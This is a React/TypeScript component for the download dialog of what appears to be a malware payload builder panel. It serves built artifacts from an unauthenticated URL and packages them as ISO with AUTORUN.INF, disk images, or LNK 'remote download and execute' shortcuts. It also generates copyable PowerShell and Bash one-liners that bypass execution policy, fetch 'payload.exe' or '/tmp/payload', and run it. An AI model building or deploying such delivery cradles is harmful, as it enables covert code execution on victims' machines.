import { useMemo, useState } from 'react';
import { useTranslation } from 'react-i18next';
import { Button, Chip, Modal } from '@heroui/react';
import { Copy, ArrowDownToLine } from '@gravity-ui/icons';
import type { BuildRecordDetail } from '../../types/models';
import { getArtifactUrl, getBuildDownloadUrlByFormat } from '../../api/build';
import { PLATFORM_LABEL } from './constants';

interface BuilderDownloadModalProps {
  record: BuildRecordDetail | null;
  onClose: () => void;
}

interface FormatOption {
  id: string;
  label: string;
  desc: string;
  /** 是否生成下载命令（远程执行方式）。 */
  command?: boolean;
}

/** 支持的下载格式（构建产物不变，按需打包）。 */
const FORMATS: FormatOption[] = [
  { id: 'exe', label: 'EXE', desc: '原始可执行文件' },
  { id: 'iso', label: 'ISO', desc: '光盘镜像（含 SETUP.EXE + AUTORUN.INF）', command: true },
  { id: 'img', label: 'IMG', desc: 'FAT16 磁盘镜像（USB 写入）', command: true },
  { id: 'vhd', label: 'VHD', desc: '虚拟磁盘（Windows 双击挂载）', command: true },
  { id: 'lnk', label: 'LNK', desc: '快捷方式（远程下载并执行）', command: true },
];

export function BuilderDownloadModal({ record, onClose }: BuilderDownloadModalProps) {
  const { t } = useTranslation();
  const [copied, setCopied] = useState(false);
  const [activeFormat, setActiveFormat] = useState('exe');

  // 匿名下载 URL（构建产物直出，无需鉴权）
  const artifactUrl = useMemo(() => (record ? getArtifactUrl(record.id) : ''), [record]);

  const os = record?.platform.startsWith('linux') ? 'linux' : 'windows';

  /** 一键命令：按平台给出 PowerShell / Cmd / Bash 变体。 */
  const commands = useMemo(() => {
    if (!record) return { powershell: '', cmd: '', bash: '' };
    const url = artifactUrl;
    return {
      powershell:
        `powershell -NoProfile -ExecutionPolicy Bypass -Command "$u='${url}';$f=Join-Path $env:TEMP 'payload.exe';` +
        `(New-Object Net.WebClient).DownloadFile($u,$f);Start-Process $f"`,
      cmd:
        `powershell -NoProfile -ExecutionPolicy Bypass -Command "$u='${url}';$f=Join-Path $env:TEMP 'payload.exe';` +
        `(New-Object Net.WebClient).DownloadFile($u,$f);Start-Process $f"`,
      bash:
        `curl -fsSL ${url} -o /tmp/payload && chmod +x /tmp/payload && /tmp/payload &`,
    };
  }, [record, artifactUrl]);

  const copy = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch { /* clipboard unavailable */ }
  };

  const download = (format: string) => {
    if (!record) return;
    window.open(getBuildDownloadUrlByFormat(record.id, format), '_blank');
  };

  if (!record) return null;

  const format: FormatOption = (FORMATS.find(f => f.id === activeFormat) ?? FORMATS[0]) as FormatOption;
  const activeId = format.id;

  return (
    <Modal.Backdrop isOpen onOpenChange={(open) => { if (!open) onClose(); }}>
      <Modal.Container size="lg">
        <Modal.Dialog>
          <Modal.CloseTrigger />
          <Modal.Header>
            <Modal.Heading>{t('builder.downloadTitle')}</Modal.Heading>
          </Modal.Header>
          <Modal.Body>
            <div className="space-y-4 text-sm">
              {/* 构建信息 */}
              <div className="flex flex-wrap items-center gap-2">
                <Chip size="sm" variant="secondary">
                  {PLATFORM_LABEL[record.platform] || record.platform}
                </Chip>
                <Chip size="sm" variant="secondary" color="success">
                  {record.fileName}
                </Chip>
                <span className="text-xs text-default-500">
                  {record.status === 'completed' ? t('builder.completed') : t('builder.failed')}
                </span>
              </div>

              {/* 格式选择 */}
              <div>
                <div className="flex flex-wrap gap-2">
                  {FORMATS.map(f => (
                    <Button
                      key={f.id}
                      size="sm"
                      variant={activeId === f.id ? 'primary' : 'secondary'}
                      onPress={() => setActiveFormat(f.id)}
                      className="min-w-0"
                    >
                      {f.label}
                    </Button>
                  ))}
                </div>
                <p className="mt-1 text-xs text-default-500">{format.desc}</p>
              </div>

              {/* 下载 / 复制 */}
              <div className="flex flex-wrap gap-2">
                <Button variant="primary" size="sm" onPress={() => download(activeId)}>
                  <ArrowDownToLine className="w-4 h-4" />
                  {t('builder.download')}
                </Button>
                {format.command && (
                  <Button variant="outline" size="sm" onPress={() => download('lnk')}>
                    <ArrowDownToLine className="w-4 h-4" />
                    {t('builder.downloadLnk')}
                  </Button>
                )}
              </div>

              {/* 一键命令 */}
              {format.command && (
                <div className="space-y-2">
                  <p className="font-semibold">{t('builder.oneClickCmd')}</p>
                  {os === 'windows' ? (
                    <>
                      <CommandBlock label="PowerShell" text={commands.powershell} onCopy={copy} copied={copied} />
                      <CommandBlock label="Cmd" text={commands.cmd} onCopy={copy} copied={copied} />
                    </>
                  ) : (
                    <CommandBlock label="Bash" text={commands.bash} onCopy={copy} copied={copied} />
                  )}
                </div>
              )}

              {/* 匿名 URL 提示 */}
              <p className="text-xs text-warning">
                {t('builder.anonUrlHint', { url: artifactUrl })}
              </p>
            </div>
          </Modal.Body>
        </Modal.Dialog>
      </Modal.Container>
    </Modal.Backdrop>
  );
}

interface CommandBlockProps {
  label: string;
  text: string;
  onCopy: (text: string) => void;
  copied: boolean;
}

function CommandBlock({ label, text, onCopy, copied }: CommandBlockProps) {
  return (
    <div>
      <div className="flex items-center justify-between mb-1">
        <span className="text-xs font-mono text-default-500">{label}</span>
        <Button size="sm" variant="ghost" onPress={() => onCopy(text)} className="h-7 min-w-0 px-2">
          <Copy className="w-3 h-3" />
          {copied ? 'Copied' : 'Copy'}
        </Button>
      </div>
      <pre className="bg-default-100 rounded p-2 font-mono text-xs whitespace-pre-wrap break-all leading-5 select-all">
        {text}
      </pre>
    </div>
  );
}
